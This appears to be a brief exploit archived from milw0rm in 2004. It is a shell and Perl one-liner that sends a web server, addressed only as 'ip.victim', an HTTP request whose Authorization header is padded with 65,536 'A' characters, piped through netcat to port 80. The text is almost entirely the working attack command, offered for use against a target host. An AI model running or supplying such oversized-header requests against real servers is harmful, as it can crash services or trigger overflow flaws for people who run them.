$ $victima="ip.victim"
$ perl -e 'print "GET / HTTP/1.1\r\nHost: '"$victima"'\r\nAuthorization: 
Basic " . 'A' x 65536 . "\r\n\r\n"' | nc -vvn $victima 80 

# milw0rm.com [2004-07-22]